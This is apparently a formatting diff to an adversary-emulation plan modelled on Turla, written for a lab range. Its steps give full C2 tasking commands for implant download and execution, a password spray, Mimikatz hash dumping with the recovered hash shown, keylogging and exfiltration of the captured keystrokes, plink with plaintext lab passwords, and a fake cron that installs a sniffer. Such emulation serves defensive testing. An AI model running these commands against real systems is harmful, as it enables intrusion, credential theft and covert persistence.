@@ -1,6 +1,7 @@
 # Scenario Overview
 
 Legend of symbols:
+
 * :bulb: - callout notes
 * :heavy_exclamation_mark: - extremely important note
 * :arrow_right: - Switching to another session
@@ -34,6 +35,7 @@ NTFVersion.exe. This executable contains another malicious executable, the
 injector for the EPIC implant.
 
 When the fake updater is run by the user:
+
 1. The updater writes the embedded injector to the user's path indicated by the
 `%TEMP%` environment variable as `mxs_installer.exe`.
 1. The updater adds a `Shell` key value to the current user's `Winlogon`
@@ -167,9 +169,9 @@ escalation by abusing weak registry permissions.
 Once C2 communications have been established between EPIC and the C2 via the
 proxy server, initial network enumeration is performed on the first host
 where information about the host device, local and domain groups, and network
-configurations is collected. 
+configurations is collected.
 
-At this point, the domain controller `bannik (10.20.10.9)` and several domain 
+At this point, the domain controller `bannik (10.20.10.9)` and several domain
 administrator accounts, including `frieda`, are discovered. A custom service is
 also discovered.
 
@@ -189,10 +191,12 @@ we will not be using this logon session for subsequent activity.
 * Within your Kali control server terminal window, right click and select "Split Terminal Horizontally". Be careful not to terminate the control server.
 
 * In your lower terminal tab, copy and paste the first set of discovery commands:
+
 ```bash
 cd /opt/day1/turla/Resources/control_server
 ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | net group "Domain Admins" /domain && net group "Domain Computers" /domain && net group "Domain Controllers" /domain && tasklist /svc'
 ```
+
 * :heavy_exclamation_mark: Verify that the `ViperVPNSvc` service shows up in the tasklist output towards the end.
 
 ```bash
@@ -200,11 +204,13 @@ grep 'ViperVPNSvc' logs.txt -i
 ```
 
 * This should return:
-  * >```
+>
+* >```text
     >viperVpn.exe                  <PID> ViperVPNSvc
     >```
 
 * Wait 1 minute before tasking the next command to query the service and who can access it:
+
 ```bash
 ./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc && powershell "$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access"'
 ```
@@ -233,6 +239,7 @@ window.
 sc.exe \\hobgoblin stop ViperVPNSvc
 sc.exe \\hobgoblin start ViperVPNSvc
 ```
+
 ℹ️ Starting the ViperVPN service should take at least 30 seconds and eventually
 result in an error `[SC] StartService FAILED 1053`. The EPIC injector will wait
 an additional 2 minutes before performing injection. If the `[SC] StartService
@@ -270,18 +277,20 @@ device.
 
 The CARBON-DLL installer will create the following subdirectories in
 `C:\Program Files\Windows NT` for tasking-related files and output:
-- `C:\Program Files\Windows NT\2028`
-- `C:\Program Files\Windows NT\0511`
-- `C:\Program Files\Windows NT\Nlts`
+
+* `C:\Program Files\Windows NT\2028`
+* `C:\Program Files\Windows NT\0511`
+* `C:\Program Files\Windows NT\Nlts`
 
 The CARBON-DLL installer will drop the following files to disk:
-- CAST-128 encrypted configuration file to
-`%programfiles%\Windows NT\setuplst.xml`
-- Loader DLL to `%systemroot%\System32\mressvc.dll`
-- Orchestrator DLL to `%programfiles%\Windows NT\MSSVCCFG.dll`
-- Communications library DLL to `%programfiles%\Windows NT\msxhlp.dll`
 
-After successful file writes, the CARBON-DLL installer will create the `WinSys Restore Service` 
+* CAST-128 encrypted configuration file to
+`%programfiles%\Windows NT\setuplst.xml`
+* Loader DLL to `%systemroot%\System32\mressvc.dll`
+* Orchestrator DLL to `%programfiles%\Windows NT\MSSVCCFG.dll`
+* Communications library DLL to `%programfiles%\Windows NT\msxhlp.dll`
+
+After successful file writes, the CARBON-DLL installer will create the `WinSys Restore Service`
 service, written as `WinResSvc`, to execute the loader DLL.
 
 The CARBON-DLL installer then performs two registry writes to make sure that
@@ -302,13 +311,13 @@ On service execution, the loader DLL `mressvc.dll` will run under `svchost` and
 execute the orchestrator DLL `MSSVCCFG.dll`. The orchestrator DLL will then
 inject the communications library DLL `msxhlp.dll` into processes typically
 using HTTP, such as Internet Explorer. Several configuration, logging, and
-tasking files are dropped in `C:\Program Files\Windows NT`. 
+tasking files are dropped in `C:\Program Files\Windows NT`.
 
 ---
 
 ### :biohazard: Procedures
 
-:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` as `Gunter` 
+:arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` as `Gunter`
 
 * Ensure you have a Microsoft Edge window open with OWA. If not:
 
@@ -319,11 +328,13 @@ tasking files are dropped in `C:\Program Files\Windows NT`.
   | skt\Gunter  | Password1! |
 
 :arrow_right: Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:
+
 ```bash
 ./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'name | C:\Windows\System32\WinResSvc.exe | dropper.exe'
 ```
 
 * Once the download has completed successfully, wait 1 minute and then task the EPIC implant to execute the CARBON-DLL installer:
+
 ```bash
 ./evalsC2client.py --set-task 51515228-8a7b-4226-e6e3f4 'exe | C:\Windows\System32\WinResSvc.exe'
 ```
@@ -332,6 +343,7 @@ tasking files are dropped in `C:\Program Files\Windows NT`.
   * 📷 - upload a screenshot of the new implant session.
 
 * Wait 1 minute and then task the Carbon implant to execute some discovery commands:
+
 ```bash
 ./evalsC2client.py --set-task 9b5ef515 '{"id": 0, "cmd": "whoami"}'
 ```
@@ -352,7 +364,6 @@ tasking files are dropped in `C:\Program Files\Windows NT`.
   * [Upload task output over HTTP](../../Resources/Carbon/CommLib/src/CommLib.cpp#L342)
 * EPIC
   * File download [DownloadFile](../../Resources/EPIC/payload/src/epic.cpp#L441-L466)
-
 
 ### :microscope: Cited Intelligence
 
@@ -400,7 +411,7 @@ Peer-to-peer communication will occur over the `dsnap` named pipe on both partic
 ### :biohazard: Procedures
 
 :arrow_right: Return to your RDP session to `hobgoblin (10.20.20.102)` as
-`Gunter`. Minimize (do not close) the `hobgoblin (10.20.20.102)` RDP window. 
+`Gunter`. Minimize (do not close) the `hobgoblin (10.20.20.102)` RDP window.
 
 * Start a new RDP session to `bannik (10.20.10.9)` as `Frieda`:
 
@@ -420,15 +431,18 @@ passwords against the domain admin accounts and attempt to mount the `C$` drive 
 ```bash
 ./evalsC2client.py --set-task 9b5ef515  '{"id": 1, "payload": "password_spray.bat", "payload_dest": "C:\\Windows\\Temp\\winsas64.bat", "cmd": "C:\\Windows\\Temp\\winsas64.bat"}'
 ```
+
 * :heavy_exclamation_mark: Verify that the script successfully sprays `Frieda`'s password by checking the task output.
 You should see task output which states the following. It should take approximately 5 minutes to complete:
-  * > ```text
+>
+* > ```text
     > The command completed successfully.
     >
     > frieda:Password3! SUCCESS
     > ```
 
 * Wait 1 minute and then task CARBON-DLL to remove the password spray script.
+
 ```bash
 ./evalsC2client.py --set-task 9b5ef515  '{"id": 2, "cmd": "del /Q C:\\Windows\\Temp\\winsas64.bat"}'
 ```
@@ -456,12 +470,13 @@ grep 'Folder: \\Microsoft\\Windows\\Customer Experience Improvement Program' log
 ```
 
 * This should return:
-  * >    ```
-    >    Folder: \Microsoft\Windows\Customer Experience Improvement Program
-    >    TaskName                                 Next Run Time          Status         
-    >    ======================================== ====================== ===============
-    >    Consolidator                             2/24/2023 12:00:00 AM  Ready          
-    >    UsbCeip                                  N/A                    Ready      
+>
+* > ```text
+    > Folder: \Microsoft\Windows\Customer Experience Improvement Program
+    > TaskName                                 Next Run Time          Status         
+    > ======================================== ====================== ===============
+    > Consolidator                             2/24/2023 12:00:00 AM  Ready          
+    > UsbCeip                                  N/A                    Ready      
     >    ```
 
 * Wait 1 minute and then task CARBON-DLL to modify a remote scheduled task using the discovered password for the domain
@@ -486,16 +501,18 @@ with discovery commands to be run on the domain controller.
 ```bash
 ./evalsC2client.py --set-task a3e63922 '{"id": 0, "cmd": "net group /domain"}'
 ```
+
 :heavy_exclamation_mark: Verify that the `Web Servers` and `Web Server Admins` groups are in the output.
 
-
 * Wait 1 minute and then task CARBON-DLL to enumerate both groups for their members.
+
 ```bash
 ./evalsC2client.py --set-task a3e63922 '{"id": 1, "cmd": "net group \"Web Servers\" /domain && net group \"Web Server Admins\" /domain"}'
 ```
 
 * Wait 1 minute and then task CARBON-DLL to enumerate the Active Directory
 Computers.
+
 ```bash
 ./evalsC2client.py --set-task a3e63922 '{"id": 2, "cmd": "dsquery * -filter \"(&(objectclass=computer))\" -attr *"}'
 ```
@@ -508,7 +525,8 @@ grep 'cn: khabibulin' logs.txt -C 2 -i
 ```
 
 * This should return:
-  * > ```
+>
+* > ```text
     > objectClass: user
     > objectClass: computer
     > cn: khabibulin
@@ -543,13 +561,13 @@ grep 'cn: khabibulin' logs.txt -C 2 -i
 
 <br>
 
-## Step 6 - Preparation for Lateral Movement onto Second Host 
+## Step 6 - Preparation for Lateral Movement onto Second Host
 
 :microphone: `Voice Track:`
 
-Step 6 emulates Turla downloading and executing Mimikatz as `terabox.exe` 
-after gaining persistance on the machine. Execution of Mimikatz will reveal a 
-cached NTLM hash for the admin user `Adalwolfa`. This username/hash combination 
+Step 6 emulates Turla downloading and executing Mimikatz as `terabox.exe`
+after gaining persistance on the machine. Execution of Mimikatz will reveal a
+cached NTLM hash for the admin user `Adalwolfa`. This username/hash combination
 will be used in the next step for lateral movement.
 
 ---
@@ -569,16 +587,17 @@ grep 'NTLM : 07d128430a6338f8d537f6b3ae1dc136' logs.txt -C 5 -i
 ```
 
 * This should return:
-  * >    ```
-    >    RID  : 00000456 (1110)
-    >    User : Adalwolfa
+>
+* > ```text
+    > RID  : 00000456 (1110)
+    > User : Adalwolfa
     >
-    >    * Primary
-    >        NTLM : 07d128430a6338f8d537f6b3ae1dc136
-    >        LM   : 
-    >    Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
-    >        ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
-    >        lm  - 0: 95b8536c32208871930216e62d5e12d4
+    > * Primary
+    >     NTLM : 07d128430a6338f8d537f6b3ae1dc136
+    >     LM   : 
+    > Hash NTLM: 07d128430a6338f8d537f6b3ae1dc136
+    >     ntlm- 0: 07d128430a6338f8d537f6b3ae1dc136
+    >     lm  - 0: 95b8536c32208871930216e62d5e12d4
     >    ```
 
 ### :moyai: Source Code
@@ -663,6 +682,7 @@ installer to Adalwolfa's workstation and (2) execute it using PsExec.
 :heavy_exclamation_mark: Verify that a new Carbon implant has been registered with the control server.
 
 * Wait 1 minute and then task the CARBON-DLL implant on the domain controller to clean up dropped files.
+
 ```bash
 ./evalsC2client.py --set-task a3e63922 '{"id": 7, "cmd": "del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe"}'
 ```
@@ -718,6 +738,7 @@ to make a small change.
 
 * From your Kali C2 server terminal window, task the CARBON-DLL on Adalwolfa's workstation to download and execute the
 keylogger binary in the background:
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 0, "payload": "keylogger.exe", "payload_dest": "C:\\Windows\\Temp\\wingtsvcupdt.exe", "cmd": "C:\\Windows\\Temp\\wingtsvcupdt.exe -r"}'
 ```
@@ -736,20 +757,23 @@ ssh adalwolfa@10.20.10.23
 
 * Within the SSH session, **type do not copy** the follow commands as
 `Adalwolfa`:
+
 1. `sudo nano /var/www/html/index.html`
 1. Go to line 198 with `CTRL + SHIFT + -` then type 198
 1. Replace `Apache2 Ubuntu Default Page` with `Adalwolfa's Page`
 1. save the file with `CTRL + X`, `Y`, `enter`
 1. Type `exit` to exit from the SSH session
 
-:arrow_right: Return to the Kali C2 server and task the CARBON-DLL implant 
+:arrow_right: Return to the Kali C2 server and task the CARBON-DLL implant
 on Adalwolfa's workstation to kill the keylogger process.
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 1, "cmd": "taskkill /IM wingtsvcupdt.exe /F"}'
 ```
 
 * Wait 1 minute and then task the CARBON-DLL implant to exfiltrate the data written
 to the keylogger file:
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 2, "cmd": "type %temp%\\~DFA512.tmp"}'
 ```
@@ -757,6 +781,7 @@ to the keylogger file:
 :heavy_exclamation_mark: Verify that the keystrokes were logged containing the website information and Adalwolfa's SSH credentials.
 
 * Wait 1 minute and then task the CARBON-DLL implant to remove the keylogger and keylogger output file:
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 3, "cmd": "del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp"}'
 ```
@@ -801,10 +826,11 @@ Lastly, CARBON-DLL downloads `plink.exe` and, using the credentials keylogged in
 the previous step, executes Penquin on the Apache server.
 
 Penquin performs the following actions:
+
 * Unpacking a binary (the compiled sniffer) named `cron` and adding executable permissions
 * Copying `cron` into `/usr/bin/` as `cron`
 * Stopping the cron service
-* Creating a cron service file in the `/etc/systemd/system/` folder for `systemd` to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in `/etc/systemd/system/` are executed before files in the `/usr/sbin/cron` 
+* Creating a cron service file in the `/etc/systemd/system/` folder for `systemd` to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in `/etc/systemd/system/` are executed before files in the `/usr/sbin/cron`
 * Reloading and starting the cron service
 * Our cron service installs the sniffer and executes real cron as a child process
 
@@ -839,13 +865,15 @@ to download Penquin (named `tmp504e.tmp`).
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 7, "payload": "plink.exe", "payload_dest": "C:\\Windows\\Temp\\plink.exe", "cmd": "move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe && dir C:\\Windows\\System32\\plink.exe"}'
 ```
 
-* Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~8 seconds to execute). 
+* Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~8 seconds to execute).
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 8, "cmd": "(echo unzip /tmp/tmp514f524f -d /tmp & echo sudo mv /tmp/hsperfdata /root/hsperfdata & echo sudo /root/hsperfdata & echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l adalwolfa -pw Password2! 10.20.10.23"}'
 ```
 
 * Ensure no commands returned errors in the plink output:
-  * > ```
+>
+* > ```shell
     > unzip /tmp/tmp514f524f -d /tmp 
     > 
     > sudo mv /tmp/hsperfdata /root/hsperfdata 
@@ -867,10 +895,10 @@ to download Penquin (named `tmp504e.tmp`).
     > ```
 
 * Wait 1 minute and then task the implant to clean up downloaded files
+
 ```bash
 ./evalsC2client.py --set-task c6f2aa03 '{"id": 9, "cmd": "del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe"}'
 ```
-
 
 ### :moyai: Source Code
 
